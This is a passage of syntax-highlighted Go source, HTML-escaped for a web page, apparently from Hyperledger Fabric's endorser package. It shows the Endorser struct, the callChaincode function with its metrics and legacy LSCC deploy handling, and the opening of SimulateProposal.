&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;GetLedgerHeight&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;channelID&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;) (&lt;span style=&#34;color:#66d9ef&#34;&gt;uint64&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;error&lt;/span&gt;)

	&lt;span style=&#34;color:#75715e&#34;&gt;// GetDeployedCCInfoProvider returns ledger.DeployedChaincodeInfoProvider
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;GetDeployedCCInfoProvider&lt;/span&gt;() &lt;span style=&#34;color:#a6e22e&#34;&gt;ledger&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;DeployedChaincodeInfoProvider&lt;/span&gt;
}

&lt;span style=&#34;color:#75715e&#34;&gt;//go:generate counterfeiter -o fake/channel_fetcher.go --fake-name ChannelFetcher . ChannelFetcher
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;// ChannelFetcher fetches the channel context for a given channel ID.
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;type&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ChannelFetcher&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;interface&lt;/span&gt; {
	&lt;span style=&#34;color:#a6e22e&#34;&gt;Channel&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;channelID&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Channel&lt;/span&gt;
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;type&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Channel&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; {
	&lt;span style=&#34;color:#a6e22e&#34;&gt;IdentityDeserializer&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;msp&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;IdentityDeserializer&lt;/span&gt;
}

&lt;span style=&#34;color:#75715e&#34;&gt;// Endorser provides the Endorser service ProcessProposal
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;type&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Endorser&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; {
	&lt;span style=&#34;color:#a6e22e&#34;&gt;ChannelFetcher&lt;/span&gt;         &lt;span style=&#34;color:#a6e22e&#34;&gt;ChannelFetcher&lt;/span&gt;
	&lt;span style=&#34;color:#a6e22e&#34;&gt;LocalMSP&lt;/span&gt;               &lt;span style=&#34;color:#a6e22e&#34;&gt;msp&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;IdentityDeserializer&lt;/span&gt;
	&lt;span style=&#34;color:#a6e22e&#34;&gt;PrivateDataDistributor&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;PrivateDataDistributor&lt;/span&gt;
	&lt;span style=&#34;color:#a6e22e&#34;&gt;Support&lt;/span&gt;                &lt;span style=&#34;color:#a6e22e&#34;&gt;Support&lt;/span&gt;
	&lt;span style=&#34;color:#a6e22e&#34;&gt;PvtRWSetAssembler&lt;/span&gt;      &lt;span style=&#34;color:#a6e22e&#34;&gt;PvtRWSetAssembler&lt;/span&gt;
	&lt;span style=&#34;color:#a6e22e&#34;&gt;Metrics&lt;/span&gt;                &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Metrics&lt;/span&gt;
}

&lt;span style=&#34;color:#75715e&#34;&gt;// call specified chaincode (system or user)
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Endorser&lt;/span&gt;) &lt;span style=&#34;color:#a6e22e&#34;&gt;callChaincode&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;txParams&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;ccprovider&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;TransactionParams&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;input&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;pb&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeInput&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;chaincodeName&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;) (&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;pb&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Response&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;pb&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeEvent&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;error&lt;/span&gt;) {
	&lt;span style=&#34;color:#66d9ef&#34;&gt;defer&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;start&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;time&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Time&lt;/span&gt;) {
		&lt;span style=&#34;color:#a6e22e&#34;&gt;logger&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;endorserLogger&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;WithOptions&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;zap&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;AddCallerSkip&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;))
		&lt;span style=&#34;color:#a6e22e&#34;&gt;logger&lt;/span&gt; = &lt;span style=&#34;color:#a6e22e&#34;&gt;decorateLogger&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;logger&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;txParams&lt;/span&gt;)
		&lt;span style=&#34;color:#a6e22e&#34;&gt;elapsedMillisec&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;time&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Since&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;start&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;Milliseconds&lt;/span&gt;()
		&lt;span style=&#34;color:#a6e22e&#34;&gt;logger&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Infof&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;finished chaincode: %s duration: %dms&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;chaincodeName&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;elapsedMillisec&lt;/span&gt;)
	}(&lt;span style=&#34;color:#a6e22e&#34;&gt;time&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Now&lt;/span&gt;())

	&lt;span style=&#34;color:#a6e22e&#34;&gt;meterLabels&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; []&lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;{
		&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;channel&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;txParams&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChannelID&lt;/span&gt;,
		&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;chaincode&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;chaincodeName&lt;/span&gt;,
	}

	&lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;ccevent&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Support&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Execute&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;txParams&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;chaincodeName&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;input&lt;/span&gt;)
	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
		&lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Metrics&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;SimulationFailure&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;With&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;meterLabels&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;Add&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;
	}

	&lt;span style=&#34;color:#75715e&#34;&gt;// per doc anything &amp;lt; 400 can be sent as TX.
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;// fabric errors will always be &amp;gt;= 400 (ie, unambiguous errors )
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;// &amp;#34;lscc&amp;#34; will respond with status 200 or 500 (ie, unambiguous OK or ERROR)
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Status&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;shim&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ERRORTHRESHOLD&lt;/span&gt; {
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;
	}

	&lt;span style=&#34;color:#75715e&#34;&gt;// Unless this is the weirdo LSCC case, just return
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;chaincodeName&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;lscc&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; len(&lt;span style=&#34;color:#a6e22e&#34;&gt;input&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Args&lt;/span&gt;) &amp;lt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; (string(&lt;span style=&#34;color:#a6e22e&#34;&gt;input&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Args&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;deploy&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; string(&lt;span style=&#34;color:#a6e22e&#34;&gt;input&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Args&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;upgrade&amp;#34;&lt;/span&gt;) {
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;ccevent&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;
	}

	&lt;span style=&#34;color:#75715e&#34;&gt;// ----- BEGIN -  SECTION THAT MAY NEED TO BE DONE IN LSCC ------
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;// if this a call to deploy a chaincode, We need a mechanism
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;// to pass TxSimulator into LSCC. Till that is worked out this
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;// special code does the actual deploy, upgrade here so as to collect
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;// all state under one TxSimulator
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;//
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;// NOTE that if there&amp;#39;s an error all simulation, including the chaincode
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;// table changes in lscc will be thrown away
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;cds&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;protoutil&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;UnmarshalChaincodeDeploymentSpec&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;input&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Args&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;])
	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
		&lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Metrics&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;SimulationFailure&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;With&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;meterLabels&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;Add&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;
	}

	&lt;span style=&#34;color:#75715e&#34;&gt;// this should not be a system chaincode
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Support&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;IsSysCC&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;cds&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeSpec&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeId&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Name&lt;/span&gt;) {
		&lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Metrics&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;SimulationFailure&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;With&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;meterLabels&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;Add&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;errors&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Errorf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;attempting to deploy a system chaincode %s/%s&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;cds&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeSpec&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeId&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Name&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;txParams&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChannelID&lt;/span&gt;)
	}

	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; len(&lt;span style=&#34;color:#a6e22e&#34;&gt;cds&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;CodePackage&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; {
		&lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Metrics&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;SimulationFailure&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;With&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;meterLabels&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;Add&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;errors&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Errorf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;lscc upgrade/deploy should not include a code packages&amp;#34;&lt;/span&gt;)
	}

	&lt;span style=&#34;color:#a6e22e&#34;&gt;_&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;_&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; = &lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Support&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ExecuteLegacyInit&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;txParams&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;cds&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeSpec&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeId&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Name&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;cds&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeSpec&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeId&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Version&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;cds&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeSpec&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Input&lt;/span&gt;)
	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
		&lt;span style=&#34;color:#75715e&#34;&gt;// increment the failure to indicate instantion/upgrade failures
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;meterLabels&lt;/span&gt; = []&lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;{
			&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;channel&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;txParams&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChannelID&lt;/span&gt;,
			&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;chaincode&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;cds&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeSpec&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeId&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Name&lt;/span&gt;,
		}
		&lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Metrics&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;InitFailed&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;With&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;meterLabels&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;Add&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;
	}

	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;ccevent&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;

}

&lt;span style=&#34;color:#75715e&#34;&gt;// SimulateProposal simulates the proposal by calling the chaincode
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Endorser&lt;/span&gt;) &lt;span style=&#34;color:#a6e22e&#34;&gt;SimulateProposal&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;txParams&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;ccprovider&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;TransactionParams&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;chaincodeName&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;chaincodeInput&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;pb&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeInput&lt;/span&gt;) (&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;pb&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Response&lt;/span&gt;, []&lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;pb&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeEvent&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;error&lt;/span&gt;) {
	&lt;span style=&#34;color:#a6e22e&#34;&gt;logger&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;decorateLogger&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;endorserLogger&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;txParams&lt;/span&gt;)

	&lt;span style=&#34;color:#a6e22e&#34;&gt;meterLabels&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; []&lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;{
		&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;channel&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;txParams&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChannelID&lt;/span&gt;,
